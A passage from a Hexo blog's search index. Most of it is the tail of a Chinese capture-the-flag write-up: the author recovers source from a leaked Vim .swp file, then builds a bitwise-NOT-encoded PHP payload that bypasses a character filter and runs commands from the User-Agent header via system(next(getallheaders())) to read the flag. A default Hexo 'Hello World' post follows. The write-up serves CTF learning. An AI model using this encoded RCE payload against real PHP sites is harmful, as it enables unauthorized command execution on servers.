退出，不进行任何操作。</span><br><span class="line">A: 中止操作，类似于退出。</span><br><span class="line">选择适当的选项，处理交换文件后再继续编辑主文件。</span><br><span class="line"></span><br><span class="line">通过这些方法，你可以用 Vim 打开和查看 .swp 文件。要特别注意的是，.swp 文件主要用于 Vim 的数据恢复，所以一般不建议直接编辑它们，而是通过恢复和处理的方式进行操作。</span><br></pre></td></tr></table></figure><p>然后，我们直接访问&#x2F;.index.php.swp</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053910.png" alt="img"></p><p>在kali中打开 vim -r index.php.swp</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051195.png" alt="img"></p><p>源码如上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">substr(md5(mt_rand() . sha1(mt_rand())), 0, 5) 是一段 PHP 代码，用于生成一个长度为 5 的随机字符串。下面是这段代码的具体解析：</span><br><span class="line"></span><br><span class="line">mt_rand():</span><br><span class="line"></span><br><span class="line">mt_rand() 是一个生成随机整数的函数，基于 Mersenne Twister 算法，比 rand() 更快并且提供更高的随机性。</span><br><span class="line">该函数会返回一个介于 0 和 RAND_MAX 之间的随机整数。</span><br><span class="line">sha1(mt_rand()):</span><br><span class="line"></span><br><span class="line">生成一个随机整数，然后计算其 SHA-1 哈希值。</span><br><span class="line">SHA-1 哈希值是一个 40 字符的十六进制字符串。</span><br><span class="line">连接随机值和 SHA-1 哈希值:</span><br><span class="line"></span><br><span class="line">mt_rand() . sha1(mt_rand()) 生成两个随机整数，并将它们的值连接起来。</span><br><span class="line">md5():</span><br><span class="line"></span><br><span class="line">对连接后的字符串计算其 MD5 哈希值。</span><br><span class="line">MD5 哈希值是一个 32 字符的十六进制字符串。</span><br><span class="line">substr():</span><br><span class="line"></span><br><span class="line">从生成的 MD5 哈希值中提取前 5 个字符。</span><br><span class="line">组合起来，代码的具体执行顺序如下：</span><br><span class="line"></span><br><span class="line">调用 mt_rand() 生成一个随机整数。</span><br><span class="line">调用 sha1() 生成另一个随机整数的 SHA-1 哈希值。</span><br><span class="line">将这两个值连接起来形成一个字符串。</span><br><span class="line">计算这个字符串的 MD5 哈希值。</span><br><span class="line">从 MD5 哈希值中提取前 5 个字符。</span><br><span class="line">因此，代码的作用是生成一个相对随机的 5 字符长的字符串</span><br></pre></td></tr></table></figure><p>可以看到进行了长度限制和过滤，并且那个md5值也在变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">前置知识：</span><br><span class="line"></span><br><span class="line">(<span class="string">&#x27;phpinfo&#x27;</span>)()</span><br><span class="line">[<span class="string">&#x27;phpinfo&#x27;</span>][<span class="number">0</span>]()</span><br><span class="line">[<span class="string">&#x27;phpinfo&#x27;</span>]&#123;<span class="number">0</span>&#125;()</span><br><span class="line">效果作用是一样的。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(): [~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>][~%CF]();</span><br><span class="line">加这个[~%FF]只是因为php7的解析方式，当然换成其他的也可以例如[~%EF] [~%CF]</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">getallheaders</span>() 获取所有 HTTP 头信息，返回一个关联数组。</span><br><span class="line"><span class="title function_ invoke__">next</span>() 试图将数组的内部指针移动到下一个元素，并返回该元素的值。</span><br><span class="line"></span><br><span class="line">假设 HTTP 头包含以下信息：</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [Host] =&gt; example.com</span><br><span class="line">    [User-Agent] =&gt; Mozilla/<span class="number">5.0</span></span><br><span class="line">    [Accept] =&gt; text/html</span><br><span class="line">    [Connection] =&gt; keep-alive</span><br><span class="line">)</span><br><span class="line">当你执行 <span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">getallheaders</span>()) 时：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$headers</span> = <span class="title function_ invoke__">getallheaders</span>(); <span class="comment">// 获取所有 HTTP 头信息</span></span><br><span class="line"><span class="variable">$nextHeader</span> = <span class="title function_ invoke__">next</span>(<span class="variable">$headers</span>); <span class="comment">// 将指针移动到下一个元素，并返回该元素的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nextHeader</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">在这个示例中，<span class="variable">$nextHeader</span> 将包含 Mozilla/<span class="number">5.0</span>，因为这是数组中的第二个元素。</span><br></pre></td></tr></table></figure><p>因为UA是可控的，所以一般在UA进行RCE</p><p>然后，我们抓包看一下</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052054.png" alt="img"></p><p>在第二位，所以构造语句拿到http头，并且执行在UA中的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即：<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure><p>然后，进行取反绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052657.png" alt="img"></p><p>查看效果</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053275.png" alt="img"></p><p>然后，直接cat &#x2F;flll1114gggggg</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053789.png" alt="img"></p><p>参考：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>article title</title>
      <link href="/2024/06/02/article-title/"/>
      <url>/2024/06/02/article-title/</url>
      
        <content type="html"><![CDATA[<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406011811697.jpg" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -这是一个测试 -文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/06/02/hello-world/"/>
      <url>/2024/06/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
